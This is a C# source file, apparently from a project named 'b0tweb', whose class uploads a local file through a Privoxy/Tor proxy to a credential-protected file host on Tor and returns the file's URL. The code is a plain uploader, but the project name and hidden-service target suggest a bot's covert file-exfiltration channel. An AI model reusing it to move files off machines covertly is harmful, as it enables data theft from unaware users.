using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Threading;
using System.IO;
using Newtonsoft.Json;

namespace b0tweb
{
    /// <summary>
    /// Upload a file to a private Pomf Clone.
    /// </summary>
    class HTTPUpload
    {
        private const string ProxyAddress = "localhost:8118";

        /// <summary>
        /// Prepare the boundary of the request.
        /// </summary>
        /// <param name="request">A <see cref="HttpWebRequest"/> object.</param>
        /// <param name="filePath">Path to the file to upload.</param>
        /// <returns>The boundary string</returns>
        private static string PrepareRequestBoundary(HttpWebRequest request, string filePath)
        {
            Stream stream = request.GetRequestStream();

            string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
            request.ContentType = String.Format("multipart/form-data; boundary={0}", boundary);
            byte[] boundarybytes = Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
            request.GetRequestStream().Write(boundarybytes, 0, boundarybytes.Length);

            string header = String.Format("Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n",
                "files[]",
                Path.GetFileName(filePath),
                "text/plain");

            byte[] bytes = Encoding.UTF8.GetBytes(header);
            stream.Write(bytes, 0, bytes.Length);

            return boundary;
        }

        /// <summary>
        /// Write the contents of the file located at <c>filePath</c> to the <c>request</c> input stream.
        /// </summary>
        /// <param name="request">A <see cref="HttpWebRequest"/> object.</param>
        /// <param name="filePath">Path to the file to upload.</param>
        private static void WriteFileContent(HttpWebRequest request, string filePath)
        {
            Stream stream = request.GetRequestStream();
            FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read);
            byte[] buffer = new byte[4096];
            int read = 0;
            while ((read = fileStream.Read(buffer, 0, buffer.Length)) != 0)
            {
                stream.Write(buffer, 0, read);
            }

            fileStream.Close();
        }

        /// <summary>
        /// Write the end of the boundary to the <c>request</c> input stream.
        /// </summary>
        /// <param name="request">A <see cref="HttpWebRequest"/> object.</param>
        /// <param name="boundary">The boundary to write.</param>
        private static void EndRequestBoundary(HttpWebRequest request, string boundary)
        {
            Stream stream = request.GetRequestStream();
            byte[] bytes = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
            stream.Write(bytes, 0, bytes.Length);

            stream.Close();
        }

        /// <summary>
        /// Upload a file to the hosted pomf clone on Tor.
        /// </summary>
        /// <param name="filePath">Path to the file to upload.</param>
        /// <returns>Empty string if something went wrong, else an URL pointing to a file.</returns>
        public static string Upload(string filePath)
        {
            // Enable proxy
            Privoxy privoxy = new Privoxy();
            privoxy.Establish();

            // Set the credentials of the request
            string username = Configuration.HTTPUsername;
            string password = Configuration.HTTPPassword;
            string credentials = Convert.ToBase64String(Encoding.GetEncoding("ISO-8859-1").GetBytes(username + ":" + password));

            //Create the basics of the request
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Configuration.HTTPServer);
            request.Headers.Add("Authorization", "Basic " + credentials);
            request.Method = "POST";
            request.Proxy = new WebProxy(HTTPUpload.ProxyAddress);
            request.KeepAlive = true;

            string boundary = PrepareRequestBoundary(request, filePath);
            WriteFileContent(request, filePath);
            EndRequestBoundary(request, boundary);

            string reply = String.Empty;
            try
            {
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                {
                    StreamReader reader = new StreamReader(response.GetResponseStream());
                    reply = reader.ReadToEnd();
                }
            } catch
            {
                // TODO: discuss about exceptions
                return String.Empty;
            }

            privoxy.Disconnect();
            dynamic json = JsonConvert.DeserializeObject(reply);

            // needs to be compared with a type due to it being a dynamic
            if (json.success == true)
            {
                return json.files[0].url;
            }

            return String.Empty;
        }
    }
}
